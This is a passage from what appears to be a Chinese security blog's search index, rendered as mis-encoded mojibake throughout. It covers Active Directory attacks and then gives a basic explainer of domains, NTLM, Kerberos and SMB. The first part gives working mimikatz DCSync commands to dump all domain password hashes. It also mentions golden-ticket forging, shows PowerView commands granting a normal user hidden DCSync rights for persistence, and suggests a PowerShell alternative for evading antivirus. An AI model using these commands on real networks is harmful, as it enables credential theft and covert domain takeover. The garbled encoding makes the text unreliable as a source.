TOUXå…±åŒç¼–å†™ï¼Œå…¶èƒ½å¤Ÿåˆ©ç”¨å·å½±æ‹·è´æœåŠ¡ç›´æ¥è¯»å–ndts.ditå¹¶å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„å“ˆå¸Œå€¼ã€‚éœ€è¦ç®¡ç†å‘˜æƒé™ã€‚â€ è¿™ä¸ªä¸œè¥¿ å¯ä»¥å®ç°ä¸ç™»å½•åˆ°åŸŸæ§è€Œè·å–åŸŸæ§ä¸Šçš„æ•°æ®è·å¾—ä»¥ä¸‹æƒé™å°±å¯ä»¥ä½¿ç”¨äº† Administratorsç»„å†…çš„ç”¨æˆ· Domain Adminsç»„å†…çš„ç”¨æˆ· Enterprise Adminsç»„å†…çš„ç”¨æˆ· åŸŸæ§åˆ¶å™¨çš„è®¡ç®—æœºå¸æˆ· ç„¶ååœ¨mimikatzé‡Œprivilege::debuglsadump::dcsync /user:xxxx /domain:xxxxx /csv å³å¯ æƒ³è·å–å…¨éƒ¨hashä¹Ÿå¯ä»¥lsadump::dcsync /domain:xxx.com /all /csv ç„¶åæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡krbtgt hashåˆ¶ä½œé»„é‡‘ç¥¨æ®ç™»å½•administratorã€‚å¦‚æœè¿˜æƒ³éšè”½ä¸€ç‚¹ï¼Œå¯ä»¥ç»™æ™®é€šç”¨æˆ·æ·»åŠ å¦‚ä¸‹ACE,ä½¿å…¶è·å¾—dcsyncæƒé™ DS-Replication-Get-Changes(GUID:1131f6aa-9c07-11d1-f79f-00c04fc2dcd2) DS-Replication-Get-Changes-All(GUID:1131f6ad-9c07-11d1-f79f-00c04fc2dcd2) DS-Replication-Get-Changes(GUID:89e95b76-444d-4c62-991a-0facbeda640c) å¯ä»¥ä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œpowerview.ps1å®Œæˆä»¥ä¸Šæ“ä½œ #ç»™åŸŸç”¨æˆ·hackæ·»åŠ ä»¥ä¸Šä¸‰æ¡ACEAdd-DomainObjectAcl -TargetIdentity &quot;DC&#x3D;xie,DC&#x3D;com&quot; -PrincipalIdentity hack -Rights DCSync -Verbose #ç»™åŸŸç”¨æˆ·hackåˆ é™¤ä»¥ä¸Šä¸‰æ¡ACERemove-DomainObjectAcl -TargetIdentity &quot;DC&#x3D;xie,DC&#x3D;com&quot; -PrincipalIdentity hack -Rights DCSync -Verbose ç„¶åæ™®é€šç”¨æˆ·ä¹Ÿå¯ä»¥ç”¨mimikatzè°ƒç”¨dcsyncå¯¼å‡ºhashäº† DCSYNCçš„powershellå®ç°mimikatzå…æ€è¿‡ä¸å»çš„è¯å¯ä»¥è¯•è¯•è¿™ä¸ªhttps://gist.github.com/monoxgas/9d238accd969550136db#file-invoke-dcsync-ps1 Import-Module .\\Invoke-DCSync.ps1Invoke-DCSync -DumpForest | ft -wrap -autosize &#x2F;&#x2F; å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„hashInvoke-DCSync -DumpForest -Users @(&quot;administrator&quot;) | ft -wrap -autosize &#x2F;&#x2F; å¯¼å‡ºåŸŸå†…administratorè´¦æˆ·çš„hash æˆ‘è¿™é‡ŒWIN10åŸŸæ§æ‰“ä¸é€šï¼Œä¸çŸ¥é“ä¸ºå•¥ é…åˆEXCHANGEç”¨æˆ·è¾¾åˆ°åŸŸææƒç›®çš„å‰æ:ä¸€ä¸ªexchangeé«˜æƒé™ç»„çš„ç”¨æˆ·æ§åˆ¶æƒï¼Œä¸€ä¸ªæœºå™¨è´¦æˆ· exchangeå®‰è£…åä¼šåœ¨ADä¸Šç”Ÿæˆä¸¤ä¸ªå®¹å™¨ å…¶ä¸­exchange windows permissionsç»„çš„ç”¨æˆ·æ‹¥æœ‰writeDACLæƒé™ï¼Œ Exchange Trusted Subsystem æ˜¯ Exchange Windows Permission çš„æˆå‘˜ï¼Œèƒ½ç»§æ‰¿writedaclæƒé™ï¼Œæœ‰è¿™ä¸ªæƒé™åå°±èƒ½ä½¿ç”¨dcsyncå¯¼å‡ºæ‰€æœ‰ç”¨æˆ·hashã€‚å…¶ä¸­exchange trusted subsystemç»„ç”šè‡³å¯èƒ½æœ‰ç»§æ‰¿è‡ªadministratorsç»„çš„æƒé™ã€‚ å‡è®¾æˆ‘ä»¬å·²ç»æ‹¿åˆ°äº†exchange trusted subsystemä¸­ä¸€ä¸ªç”¨æˆ·çš„æ§åˆ¶æƒã€‚é‚£ä¹ˆå°±å¯ç”¨dysyncè¿›è¡Œæƒé™ç»´æŒäº†","categories":[],"tags":[{"name":"å†…ç½‘æ¸—é€ä¸æƒé™ç»´æŒ","slug":"å†…ç½‘æ¸—é€ä¸æƒé™ç»´æŒ","permalink":"http://const27.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%8E%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"}]},{"title":"windowså†…ç½‘åŸºç¡€","slug":"Windowså†…ç½‘åŸºç¡€æ¦‚è§ˆ","date":"2021-06-28T13:51:58.220Z","updated":"2021-09-03T13:18:02.808Z","comments":true,"path":"2021/06/28/Windowså†…ç½‘åŸºç¡€æ¦‚è§ˆ/","link":"","permalink":"http://const27.com/2021/06/28/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/","excerpt":"","text":"åŸŸï¼Œå·¥ä½œç»„ï¼Œæ´»åŠ¨ç›®å½•å·¥ä½œç»„å·¥ä½œç»„å¯ä»¥è®¤ä¸ºæ˜¯åŒä¸€ç½‘ç»œå†…ï¼ŒåŠŸèƒ½ç›¸ä¼¼çš„ç”µè„‘è¿›è¡Œçš„åˆ†ç»„ã€‚ä¸¾ä¸ªä¾‹å­ï¼šâ€œåœ¨ä¸€ä¸ªç½‘ç»œå†…ï¼Œå¯èƒ½æœ‰æˆç™¾ä¸Šåƒå°ç”µè„‘ï¼Œå¦‚æœè¿™äº›ç”µè„‘ä¸è¿›è¡Œåˆ†ç»„ï¼Œéƒ½åˆ—åœ¨â€œç½‘ä¸Šé‚»å±…â€å†…ï¼Œå¯æƒ³è€ŒçŸ¥ä¼šæœ‰å¤šä¹ˆä¹±ã€‚ä¸ºäº†è§£å†³è¿™ä¸€é—®é¢˜ï¼ŒWindows 9x/NT/2000å°±å¼•ç”¨äº†â€œå·¥ä½œç»„â€è¿™ä¸ªæ¦‚å¿µï¼Œå°†ä¸åŒçš„ç”µè„‘ä¸€èˆ¬æŒ‰åŠŸèƒ½åˆ†åˆ«åˆ—å…¥ä¸åŒçš„ç»„ä¸­ï¼Œå¦‚è´¢åŠ¡éƒ¨çš„ç”µè„‘éƒ½åˆ—å…¥â€œè´¢åŠ¡éƒ¨â€å·¥ä½œç»„ä¸­ï¼Œäººäº‹éƒ¨çš„ç”µè„‘éƒ½åˆ—å…¥â€œäººäº‹éƒ¨â€å·¥ä½œç»„ä¸­ã€‚ä½ è¦è®¿é—®æŸä¸ªéƒ¨é—¨çš„èµ„æºï¼Œå°±åœ¨â€œç½‘ä¸Šé‚»å±…â€é‡Œæ‰¾åˆ°é‚£ä¸ªéƒ¨é—¨çš„å·¥ä½œç»„åï¼ŒåŒå‡»å°±å¯ä»¥çœ‹åˆ°é‚£ä¸ªéƒ¨é—¨çš„ç”µè„‘äº†ã€‚ â€è¿™å°±æ˜¯å·¥ä½œç»„ï¼Œä½†æ˜¯åœ¨å·¥ä½œç»„ä¸­çš„ç”µè„‘è¿˜æ˜¯å„è‡ªç®¡ç†ã€‚å½“å…¶ä¸­ä¸€å°è®¡ç®—æœºè®¿é—®å¦ä¸€å°è®¡ç®—æœºæ—¶è¿˜æ˜¯è¦ç»è¿‡å¦ä¸€å°è®¡ç®—æœºçš„è®¤è¯çš„ åŸŸåŸŸï¼Œæ˜¯ä¸€ç¾¤ç›¸äº’ä¿¡ä»»çš„è®¡ç®—æœºçš„é›†åˆæƒ³è¦è®¿é—®åŸŸä¸­èµ„æºå°±å¿…é¡»ç»è¿‡ä¸€å°è´Ÿè´£æ¯ä¸€å°è”å…¥ç½‘ç»œçš„ç”µè„‘å’Œç”¨æˆ·çš„éªŒè¯å·¥ä½œçš„æœåŠ¡å™¨ï¼Œè¿™ä¸ªæœåŠ¡å™¨å«åš åŸŸæ§åˆ¶å™¨ ï¼ˆDomain Controllerï¼Œç®€å†™ä¸ºDCï¼‰ çš„å®‰å…¨è®¤è¯ã€‚æ¯ä¸ªåŸŸè‡³å°‘è¦æœ‰ä¸€ä¸ªåŸŸæ§åˆ¶å™¨ã€‚å½“æŸè®¡ç®—æœºè¿å…¥åŸŸæ—¶ï¼ŒDCå°±ä¼šé‰´åˆ«è¿™å°ç”µè„‘æ˜¯å¦æ˜¯å±äºè¿™ä¸ªåŸŸçš„ï¼Œç”¨æˆ·ä½¿ç”¨çš„ç™»å½•è´¦å·æ˜¯å¦å­˜åœ¨ã€å¯†ç æ˜¯å¦æ­£ç¡®ã€‚å¦‚æœä»¥ä¸Šä¿¡æ¯ä¸æ­£ç¡®ï¼ŒåŸŸæ§åˆ¶å™¨å°±æ‹’ç»è¿™ä¸ªç”¨æˆ·ä»è¿™å°ç”µè„‘ç™»å½•ã€‚ä¸èƒ½ç™»å½•ï¼Œç”¨æˆ·å°±ä¸èƒ½è®¿é—®æœåŠ¡å™¨ä¸Šæœ‰æƒé™ä¿æŠ¤çš„èµ„æº ã€‚å¦å¤–ï¼Œå½“ä¸€ä¸ªåŸŸå’Œå¦ä¸€ä¸ªåŸŸå»ºç«‹ä¿¡ä»»å…³ç³»åï¼Œä¸¤ä¸ªåŸŸå°±å¯ä»¥æŒ‰éœ€è¦ç›¸äº’ç®¡ç† å·¥ä½œç»„å’ŒåŸŸçš„åŒºåˆ«â€œ å·¥ä½œç»„æ˜¯ä¸€ç¾¤è®¡ç®—æœºçš„é›†åˆï¼Œå®ƒä»…ä»…æ˜¯ä¸€ä¸ªé€»è¾‘çš„é›†åˆï¼Œå„è‡ªè®¡ç®—æœºè¿˜æ˜¯å„è‡ªç®¡ç†çš„ï¼Œä½ è¦è®¿é—®å…¶ä¸­çš„è®¡ç®—æœºï¼Œè¿˜æ˜¯è¦åˆ°è¢«è®¿é—®è®¡ç®—æœºä¸Šæ¥å®ç°ç”¨æˆ·éªŒè¯çš„ã€‚è€ŒåŸŸä¸åŒï¼ŒåŸŸæ˜¯ä¸€ä¸ªæœ‰å®‰å…¨è¾¹ç•Œçš„è®¡ç®—æœºé›†åˆï¼Œåœ¨åŒä¸€ä¸ªåŸŸä¸­çš„è®¡ç®—æœºå½¼æ­¤ä¹‹é—´å·²ç»å»ºç«‹äº†ä¿¡ä»»å…³ç³»ï¼Œåœ¨åŸŸå†…è®¿é—®å…¶ä»–æœºå™¨ï¼Œä¸å†éœ€è¦è¢«è®¿é—®æœºå™¨çš„è®¸å¯äº†ã€‚ â€ æ´»åŠ¨ç›®å½•æ´»åŠ¨ç›®å½• (Active Directory,AD) ,ç”¨äºå­˜å‚¨æœ‰å…³ç½‘ç»œå¯¹è±¡çš„ä¿¡æ¯ã€‚å¸®åŠ©ç”¨æˆ·å¿«é€Ÿå‡†ç¡®çš„æ‰¾åˆ°æ‰€éœ€çš„ä¿¡æ¯æœåŠ¡,â€œ å¦‚æœæŠŠä¼ä¸šçš„å†…ç½‘çœ‹æˆä¸€æœ¬å­—å…¸ï¼Œé‚£ä¹ˆå†…ç½‘é‡Œçš„èµ„æºå°±æ˜¯å­—å…¸é‡Œçš„å†…å®¹ï¼Œæ´»åŠ¨ç›®å½•å°±ç›¸å½“äºå­—å…¸çš„ç´¢å¼• â€ æ´»åŠ¨ç›®å½•çš„åŠŸèƒ½ï¼š è´¦å·é›†ä¸­ç®¡ç† è½¯ä»¶é›†ä¸­ç®¡ç† ç¯å¢ƒé›†ä¸­ç®¡ç† å¢å¼ºå®‰å…¨æ€§ æ›´å¯é ï¼Œæ›´çŸ­çš„å®•æœºæ—¶é—´ â€œè¦å®ç°åŸŸç¯å¢ƒï¼Œå®é™…ä¸Šå°±æ˜¯å®‰è£…ADï¼Œå¦‚æœå†…ç½‘ä¸­çš„ä¸€å°è®¡ç®—æœºä¸Šå®‰è£…äº†ADï¼Œå®ƒå°±å˜æˆäº†DC(ç”¨äºå­˜å‚¨æ´»åŠ¨ç›®å½•æ•°æ®åº“çš„è®¡ç®—æœº)ã€‚â€ NTLMåè®®NTLMä¹Ÿæ˜¯ä¸€ä¸ªè®¤è¯åè®®ï¼Œä¸Kerberosåè®®åŠŸèƒ½æ˜¯ä¸€æ ·çš„ï¼Œä¸è¿‡NTLMçš„å®‰å…¨æ€§å¯æ²¡æœ‰Kerberoså¥½ éªŒè¯æœºåˆ¶NTLMåè®®éªŒè¯æœºåˆ¶æ˜¯åŸºäº æŒ‘æˆ˜(chanllage)/å›åº”(response) æ¨¡å¼çš„ å®ƒçš„éªŒè¯æ¨¡å¼å¤§è‡´å¦‚ä¸‹: ç”¨æˆ·è¾“å…¥è´¦å·å¯†ç ï¼Œæœ¬åœ°æŠŠå¯†ç åŠ å¯†ä¸ºä¸€ä¸ªhashå€¼ï¼Œç§°ä¸ºNTML-Hash å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€ç”¨æˆ·å ï¼ˆè¿™ä¸ªæ•°æ®ç§°ä¸º TYPE 1 Negotiate ï¼‰ æœåŠ¡ç«¯æ¥æ”¶è¯·æ±‚ï¼Œåˆ¤æ–­æ•°æ®åº“ä¸­è¯¥ç”¨æˆ·åæ˜¯å¦å­˜åœ¨ï¼Œè‹¥å­˜åœ¨åˆ™ç”Ÿæˆä¸€ä¸ª16ä½éšæœºæ•°ç§°ä¹‹ä¸ºchanllageã€‚åŒæ—¶å°†chanllageè¿”å›ç»™å®¢æˆ·ç«¯ ï¼ˆ TYPE 2 ï¼‰ å®¢æˆ·ç«¯æ”¶åˆ°chanllageåå°†å…¶ç”¨ä¸Šé¢ç”Ÿæˆçš„hashå€¼æ¥åŠ å¯†è¿™ä¸ªchanllangeï¼Œå¹¶ä¸ç”¨æˆ·åï¼Œchanllangeç­‰ç»„åˆåˆ°ä¸€èµ·å¾—åˆ°Net-NTLMHash æœ€åå°† Net-NTLMHash å°è£…åˆ° TYPE 3 NTLM_AUTHæ¶ˆæ¯ä¸­å‘å¾€æœåŠ¡å™¨ã€‚ æœåŠ¡å™¨æ”¶åˆ°TYPE3åï¼Œç”¨è‡ªå·±æ•°æ®åº“ä¸­è¯¥ç”¨æˆ·çš„å¯†ç çš„NTML-HashåŠ å¯†chanllageï¼Œå¹¶æ¯”è¾ƒè‡ªå·±è®¡ç®—å‡ºçš„ Net-NTLMHash ä¸å®¢æˆ·ç«¯å‘è¿‡æ¥çš„ Net-NTLMHash ï¼Œè‹¥ç›¸åŒåˆ™è®¤è¯æˆåŠŸ ï¼ˆä»¥ä¸Šæ˜¯å®¢æˆ·ç«¯-æœåŠ¡ç«¯æ¨¡å‹ï¼Œè‹¥æ˜¯åœ¨åŸŸä¸­ï¼ŒéªŒè¯æ­¥éª¤å°±ä¼šæœ‰ç‚¹ä¸åŒï¼‰è‹¥åœ¨åŸŸä¸­ï¼Œé‚£ä¹ˆæœåŠ¡ç«¯åœ¨ç¬¬5æ­¥æ”¶åˆ°TYPE3åä¸ä¼šè‡ªè¡Œè¿›è¡Œæ¯”å¯¹ï¼Œè€Œæ˜¯å°† Net NTLM-Hash è½¬å‘ç»™åŸŸæ§åˆ¶å™¨DCï¼Œç”±DCè¿›è¡Œæœ€åçš„ Net NTLM-Hash æ¯”è¾ƒè®¤è¯ Kerberosåè®®Kerberosåè®®ï¼Œæ˜¯ä¸€ä¸ªå¸¸ç”¨çš„è®¤è¯ä¸æˆæƒåè®®(ä¸‹é¢åªæ˜¯ç®€åŒ–è¿‡çš„å¤§è‡´æµç¨‹ï¼Œå…·ä½“æµç¨‹è¯·çœ‹ä¸‹é¢çš„wiresharkæŠ“åŒ…åˆ†æ) æ•´ä½“æµç¨‹ å‚ä¸çš„å…³é”®è§’è‰² Client: Application Client åº”ç”¨å®¢æˆ·ç«¯ AS: Authentication Server ç”¨æ¥è®¤è¯ç”¨æˆ·èº«ä»½ TGS: Ticket-Granting Service ç”¨æ¥æˆæƒæœåŠ¡è®¿é—® SS: Service Server ç”¨æˆ·æ‰€è¯·æ±‚çš„æœåŠ¡ å…¶ä¸­ASå’ŒTGSéƒ½å±äºKDCç³»ç»Ÿï¼ˆ å¯†é’¥åˆ†å‘ä¸­å¿ƒ ï¼‰ è®¤è¯ï¼šä»¥ä¸‹çš„åŠ å¯†éƒ½æ˜¯å¯¹ç§°åŠ å¯† 1.ç”¨æˆ·ç™»å½• ç”¨æˆ·å…ˆè¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œå…¶ä¸­å¯†ç åœ¨è¿™ä¸ªé˜¶æ®µä¼šè¢«å•å‘hashå‡½æ•°åŠ å¯†ä¸ºä¸€ä¸ªå¯†é’¥ï¼Œç”¨æ¥è§£å¯†åé¢çš„ä¿¡æ¯ 2.è¯·æ±‚èº«ä»½è®¤è¯ï¼ˆclientå’ŒkdcåŒå‘è®¤è¯ï¼‰2.1 å®¢æˆ·ç«¯å‘ASå‘é€è®¤è¯è¯·æ±‚ å®¢æˆ·ç«¯å‘aså‘é€ç”¨æˆ·åä¿¡æ¯ï¼ˆæ˜æ–‡ï¼‰ï¼ˆè¿›å‘é€ç”¨æˆ·åè€Œæ²¡æœ‰å‘é€å¯†ç ï¼‰ 2.2ASç¡®è®¤å®¢æˆ·ç«¯èº«ä»½ ASå…ˆæŠŠç”¨æˆ·ååœ¨æ•°æ®åº“ä¸­æŸ¥æ‰¾ä¸€ä¸‹ï¼Œå¦‚æœè¯¥ç”¨æˆ·åå­˜åœ¨åˆ™æ‰¾åˆ°è¯¥ç”¨æˆ·çš„å¯†ç ä½¿ç”¨å•å‘hashå‡½æ•°ç”Ÿæˆclientå¯†é’¥å¹¶è¿”å›Msg Aå’ŒBã€‚Aä¸­çš„å†…å®¹æ˜¯ä¸€ä¸ªè¢«Clientå¯†é’¥åŠ å¯†çš„ç”¨äºç”ŸæˆAuthenticator1çš„æ•°æ®Bä¸­çš„å†…å®¹æ˜¯ä¸€ä¸ªè¢«TGSå¯†é’¥åŠ å¯†çš„ä¸€å †ä¿¡æ¯å«åšTGTï¼Œå½“å‰æ— TGSå¯†é’¥æ•…æ— æ³•è§£å¼€ï¼Œå…¶ä¸­åŒ…å« å®¢æˆ·ç«¯IDï¼Œæœ‰æ•ˆæœŸ ï¼ŒClientç½‘ç»œåœ°å€ä»¥åŠMSG Aè§£å¯†åçš„å†…å®¹ 3. è¯·æ±‚æœåŠ¡æˆæƒï¼ˆclientè¯·æ±‚kdcè®¤è¯serverï¼‰3.1 å®¢æˆ·ç«¯å‘TGSå‘é€è¯·æ±‚æœåŠ¡æˆæƒè¯·æ±‚ Clientåœ¨MSG Cå‘TGSå‘é€ è¯·æ±‚çš„æœåŠ¡çš„IDï¼Œ2.2ä¸­çš„TGTï¼ŒMSG D å‘é€ç”± **[Client/TGS SessionKey]**åŠ å¯†çš„Authenticator 1 {Client ID, Timestamp}ã€‚ 3.2 TGSä¸ºClientå“åº”æœåŠ¡æˆæƒç¥¨æ® Msg E ä½¿ç”¨ [Serviceå¯†é’¥] åŠ å¯†çš„Client-To-Server Ticket, è¯¥Ticketä¸­åŒ…å«äº†å¦‚ä¸‹ä¿¡æ¯: [Client/Server SessionKey] Clientç½‘ç»œåœ°å€ Ticketæœ‰æ•ˆæ—¶é—´ Client ID Msg F ä½¿ç”¨**[Client/TGS SessionKey]åŠ å¯†çš„[Client/Server SessionKey]**ã€‚ 4. å‘é€æœåŠ¡è¯·æ±‚ï¼ˆclientä¸ssåŒå‘è®¤è¯ï¼‰4.1 Clientå‘SS(Service Server)å‘é€æœåŠ¡è¯·æ±‚ å‘é€çš„æ¶ˆæ¯ä¸­åŒ…æ‹¬ï¼š Msg E ä¸Šä¸€æ­¥3.2ä¸­ï¼ŒTGSä¸ºClientå“åº”çš„æ¶ˆæ¯Msg Eã€‚è¯¥æ¶ˆæ¯å¯ä»¥ç†è§£ä¸ºç”±Clientä¸ºSSæºå¸¦çš„æ¶ˆæ¯ã€‚ Msg G ç”±**[Client/Server SessionKey]åŠ å¯†çš„Authenticator 2**ï¼ŒåŒ…å«{Client ID, Timestamp}ä¿¡æ¯ã€‚è¿™é‡Œçš„Authenticator 2åŒºåˆ«äºå‰é¢3.1æ­¥éª¤ä¸­çš„Authenticator 1ã€‚ Note [Client/Server SessionKey]**å¹¶æœªç›´æ¥é€æ˜ä¼ è¾“ï¼Œè€Œæ˜¯è¢«åŒ…å«åœ¨ä½¿ç”¨[Serviceå¯†é’¥]**åŠ å¯†çš„Msg Eä¸­ã€‚ æ—¢ç„¶**[Client/Server SessionKey]å¹¶ä¸ç›´æ¥é€æ˜ä¼ è¾“ï¼Œ Clientéœ€è¦å‘SSè¯æ˜è‡ªå·±æ‹¥æœ‰æ­£ç¡®çš„[Client/Server SessionKey]ï¼Œæ‰€ä»¥ï¼ŒAuthenticator 2ä½¿ç”¨äº†[Client/Server SessionKey]**åŠ å¯†ã€‚ 4.2 SSå“åº”Client KerberosæŠ“åŒ…åˆ†æ ä»¥ä¸Šæ˜¯kerberosåè®®ç®€åŒ–å›¾ ASREQå³å®¢æˆ·ç«¯å¾€æœåŠ¡ç«¯çš„ç¬¬ä¸€æ¬¡é€šè®¯ æˆ‘æŠ“åˆ°çš„åŒ…çš„æ ·å­,æˆ‘ä»¬æ¥è§£è¯»ä¸€ä¸‹1.pvno: æ ‡è®°ç€kerberosåè®®çš„ç‰ˆæœ¬2.msg-type: æ ‡è®°ç€è¿™ä¸ªåŒ…çš„ç±»å‹ï¼Œ ASREQå¯¹åº”çš„å°±æ˜¯KRBAS_REQ(0x0a)3.padata:ç”¨äºå­˜å‚¨ä¸€äº›è®¤è¯ä¿¡æ¯å…¶å®è¿™ä¸ªå¤´ä¸‹é¢è¿˜æœ‰å¾ˆå¤šä¸åŒçš„ç±»å‹çš„å¤´ï¼Œä½†æ˜¯è¿™é‡ŒæŠ“åˆ°äº†PA-DATA PA-ENC-TIMESTAMPå’ŒPA-DATA PA-PAC-REQUESTè¿™ä¸¤ä¸ªå¤´éƒ¨ï¼Œä½†æ˜¯è¿™ä¸¤ä¸ªå¤´éƒ¨æ˜¯padataæœ€å¸¸ç”¨æœ€æ ¸å¿ƒçš„å¤´éƒ¨.PA-DATA PA-ENC-TIMESTAMP : å°±æ˜¯ç”¨æˆ·hashåŠ å¯†çš„æ—¶é—´æˆ³,ä½œç”¨åœ¨äº:asé…åˆç”¨æˆ·çš„æ˜æ–‡è´¦æˆ·(cnameå¤´)åœ¨æ•°æ®åº“ä¸­æŸ¥è¯¢è¯¥ç”¨æˆ·æ˜¯å¦å­˜åœ¨ï¼Œè‹¥å­˜åœ¨åˆ™å–ç”¨å…¶hashæ¥è§£å¯†è¿™ä¸ªæ—¶é—´æˆ³ï¼Œè‹¥æ­ç§˜æˆåŠŸåˆ™è®¤è¯é€šè¿‡PA-DATA PA-ENC-TIMESTAMP: è¿™ä¸ªæ˜¯å¯ç”¨PAC(ä¸€ä¸ªæ§åˆ¶ç”¨æˆ·æƒé™çš„ä¸œè¥¿)æ”¯æŒçš„æ‰©å±•ã€‚4.req-body:è¯·æ±‚ä¸»ä½“ï¼Œä¹ŸåŒ…å«äº†è®¸å¤šä¿¡æ¯.è¿™ä¸ªå¤´é‡Œé¢æ¯”è¾ƒé‡è¦çš„ä¸œè¥¿æ˜¯cname:å­˜å‚¨ç€å‘é€è¯·æ±‚çš„ç”¨æˆ·åï¼ˆæ˜æ–‡ç”¨æˆ·åï¼‰sname:è¿™ä¸ªåŒ…å«çš„æ˜¯æœåŠ¡ç«¯çš„èº«ä»½, åœ¨ASREQé‡Œé¢æ˜¯krbtgt ï¼Œè¿˜æœ‰æ‰€åœ¨åŸŸåç§°ã€‚tillä¸ºåˆ°æœŸæ—¶é—´ï¼Œnonceä¸ºéšæœºç”Ÿæˆæ•°realm:æ‰€åœ¨åŸŸåç§°etype:å‘ŠçŸ¥æœåŠ¡å™¨ï¼Œè¿™ä¸ªhashçš„åŠ å¯†æ–¹å¼ ä¹‹å‰ä¸€ç›´å›°æ‰°æˆ‘çš„ â€œä¸ºä»€ä¹ˆæœ‰äº›æ–‡ç« è¯´çš„ç¬¬ä¸€æ­¥æ˜¯å‘æœåŠ¡å™¨å‘é€æ˜æ–‡è´¦æˆ·åï¼Œæœ‰äº›æ–‡ç« æ˜¯å‘æœåŠ¡å™¨å‘é€æ—¶é—´æˆ³hashâ€é—®é¢˜æŠ“äº†ä¸€ä¸‹åŒ…å°±æ‡‚äº†.. ASREP 1.ticket:è¿™ä¸ªå°±æ˜¯TGTäº†ã€‚tkt-vno:ç¥¨æ®æ ¼å¼ç‰ˆæœ¬å·realm:æ‰€åœ¨åŸŸåsname:åŒasresenc-part:è¢«krbtgtå¯†é’¥åŠ å¯†çš„ç¥¨æ®æœ¬ä½“éƒ¨åˆ†2.enc-part:è¢«client hash åŠ å¯†çš„login session key TGSREQ 1.ap-req-&gt;â€¦-&gt;tikect: å¯ä»¥å‘ç°TGSREQæŠŠæ•´ä¸ªTGTå‘é€ç»™äº†TGS2ap-req-&gt;â€¦-&gt;authenticator:è¢«login session keyåŠ å¯†çš„æ—¶é—´æˆ³å’Œclient id TGSREP 1.tikect:è¿™é‡Œå°±æ˜¯TGSéƒ¨åˆ†äº†ã€‚enc-partï¼šè¿™é‡Œçš„enc-partæ˜¯è¢«æ‰€è¯·æ±‚çš„æœåŠ¡çš„ç”¨æˆ·hashåŠ å¯†çš„2.enc-part:è¢«login session keyåŠ å¯†çš„service session key SMBåè®®SMBåè®®æ˜¯ä¸€ä¸ªç”¨äºä¸¤å°è®¡ç®—æœºé—´å…±äº«æ–‡ä»¶ ã€æ‰“å°æœºã€ä¸²å£ç­‰åŠŸèƒ½çš„åè®®ã€‚ç½‘ä¸Šé‚»å±…åŠŸèƒ½å°±æ˜¯ä¾é SMBåè®®è€Œèµ·çš„ã€‚é€šè¿‡smbåè®®ï¼Œä¸€å°è®¡ç®—æœºå¯ä»¥åœ¨ç»è¿‡smbè®¤è¯åè¯»å†™å¦ä¸€å°è®¡ç®—æœºä¸Šçš„ä¸€äº›æ–‡ä»¶ã€‚smbåè®®ä¸€èˆ¬æ¶è®¾åœ¨NetBiosåè®®ä¹‹ä¸Šã€‚NetBIOS ä½¿ç”¨ä¸‹åˆ—ç«¯å£ï¼šUDP/137ï¼ˆNetBIOS åç§°æœåŠ¡ï¼‰ã€UDP/138ï¼ˆNetBIOS æ•°æ®æŠ¥æœåŠ¡ï¼‰ã€TCP/139ï¼ˆNetBIOS ä¼šè¯æœåŠ¡ï¼‰ï¼›SMB ä½¿ç”¨ä¸‹åˆ—ç«¯å£ï¼šTCP/139ã€TCP/445ã€‚ SMBè®¤è¯å¦‚æœæˆ‘ä»¬æƒ³ä¾é smbåè®®å»è¯»å†™å¦ä¸€å°è®¡ç®—æœºä¸Šçš„æ–‡ä»¶ï¼Œé‚£ä¹ˆå…¶ä¸­çš„SMBè®¤è¯æƒ…å†µæ˜¯å¦‚ä½•å‘¢ï¼Ÿæˆ‘ä»¬ç®€å•åˆ†æä¸€ä¸‹ã€‚ 1.ç‰ˆæœ¬ç¡®ç«‹é˜¶æ®µ2.ç”¨æˆ·è®¤è¯é˜¶æ®µ3.èµ„æºé“¾æ¥é˜¶æ®µ4.èµ„æºè¯»å†™é˜¶æ®µ æ›´è¯¦ç»†ä¸€ç‚¹ã€‚1.ç‰ˆæœ¬ç¡®ç«‹é˜¶æ®µã€‚å®¢æˆ·ç«¯å…ˆå‘é€è‡ªå·±æ”¯æŒçš„SMBåè®®ç‰ˆæœ¬ç»™æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨æ”¶åˆ°åå‘å®¢æˆ·ç«¯åˆ—å‡ºå¸Œæœ›ä½¿ç”¨çš„ç‰ˆæœ¬ã€‚è‹¥å®¢æˆ·ç«¯æ”¯æŒçš„smbç‰ˆæœ¬æœåŠ¡å™¨å‡ä¸æ”¯æŒï¼Œåˆ™è¿”å› 0XFFFFHï¼Œç»“æŸé€šä¿¡ ã€‚2.ç”¨æˆ·è®¤è¯é˜¶æ®µã€‚ç¡®ç«‹å¥½è®¤è¯ç‰ˆæœ¬åï¼Œå°±æ˜¯å®¢æˆ·ç«¯å‘é€è´¦æˆ·å¯†ç ç»™æœåŠ¡ç«¯è¿›è¡Œèº«ä»½éªŒè¯äº†ã€‚æœåŠ¡å™¨æ”¶åˆ°åè¿”å›è®¤è¯æˆåŠŸæˆ–å¤±è´¥3.èµ„æºé“¾æ¥é˜¶æ®µã€‚ç”¨æˆ·è®¤è¯é€šè¿‡åï¼Œå®¢æˆ·ç«¯å‘é€è‡ªå·±æƒ³è¦è®¿é—®çš„èµ„æºåï¼ŒæœåŠ¡å™¨æ”¶åˆ°åè¿”å›å…è®¸æˆ–æ‹’ç»4.èµ„æºè¯»å†™é˜¶æ®µï¼Œå®¢æˆ·ç«¯å¼€å§‹è¯»å†™æœåŠ¡å™¨ä¸Šæ–‡ä»¶ã€‚ çœ‹èµ·æ¥æ¯”ntlmå’Œkerberosç®€å•å¤šäº†ã€‚æŠ“åŒ…åˆ†æä¸€ä¸‹ã€‚ æŠ“åŒ…åˆ†æ1.1 å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯åˆ—å‡ºå½“å‰æ”¯æŒçš„smbç‰ˆæœ¬ 1.2æœåŠ¡å™¨è¿”å›å¸Œæœ›çš„SMBç‰ˆæœ¬ 